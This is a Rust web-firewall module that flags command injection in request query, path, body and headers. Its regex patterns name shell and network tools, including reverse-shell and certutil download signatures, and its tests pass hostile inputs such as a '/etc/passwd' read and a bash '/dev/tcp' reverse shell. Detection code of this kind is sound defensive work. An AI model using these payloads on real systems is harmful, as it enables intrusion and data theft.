//! Command-injection patterns. We look for shell metacharacters paired with
//! command names that almost never appear in legitimate web traffic.

use super::{Hit, Surface, excerpt};
use once_cell::sync::Lazy;
use regex::RegexSet;

static PATTERNS: Lazy<RegexSet> = Lazy::new(|| {
    RegexSet::new([
        // Pipe / chain into a recon command.
        r"(?i)[;&|`]\s*(cat|wget|curl|nc|ncat|bash|sh|zsh|powershell|whoami|id|uname|ifconfig|ipconfig|nslookup|dig)\b",
        // Inline subshell with a recon command.
        r"(?i)\$\((?:cat|wget|curl|nc|ncat|bash|sh|whoami|id|uname)\b",
        r"(?i)`\s*(?:cat|wget|curl|nc|ncat|bash|sh|whoami|id|uname)\b",
        // Reverse-shell payload signatures.
        r"(?i)bash\s+-i\s*>&?\s*/dev/tcp/\d",
        r"(?i)/bin/(?:bash|sh)\s+-c\s+",
        // PowerShell encoded command.
        r"(?i)powershell(?:\.exe)?\s+-(?:enc(?:odedcommand)?|e)\b",
        // Common LOLBin probes (Windows).
        r"(?i)\bcertutil(?:\.exe)?\s+-urlcache\b",
    ]).expect("static cmdi regex set compiles")
});

pub fn scan(s: &Surface) -> Option<Hit> {
    for (field_name, field) in [
        ("query", &s.query_decoded),
        ("path",  &s.path_decoded),
        ("body",  &s.body_preview),
        ("headers", &s.headers_concat),
        ("uri-raw", &s.uri),
    ] {
        if PATTERNS.is_match(field) {
            return Some(Hit {
                rule_id: "CMDI-01",
                category: "cmdi",
                matched_field: field_name,
                matched_excerpt: excerpt(field),
            });
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::request::RequestCtx;
    use std::collections::HashMap;
    use std::net::IpAddr;

    fn ctx(query: &str) -> RequestCtx {
        RequestCtx {
            request_id: "t".into(), client_ip: IpAddr::from([1,2,3,4]),
            method: "GET".into(), uri: format!("/x?{query}"), path: "/x".into(),
            query: query.into(), host: "h".into(), user_agent: "".into(),
            headers: HashMap::new(), cookies: HashMap::new(),
            body_preview: vec![], content_length: None, country: None,
        }
    }

    #[test]
    fn pipe_into_cat() {
        let s = Surface::from(&ctx("file=foo;cat /etc/passwd"));
        assert!(scan(&s).is_some());
    }

    #[test]
    fn bash_reverse_shell() {
        let s = Surface::from(&ctx("c=bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"));
        assert!(scan(&s).is_some());
    }

    #[test]
    fn benign_passes() {
        let s = Surface::from(&ctx("q=we|love|cats"));
        assert!(scan(&s).is_none());
    }
}
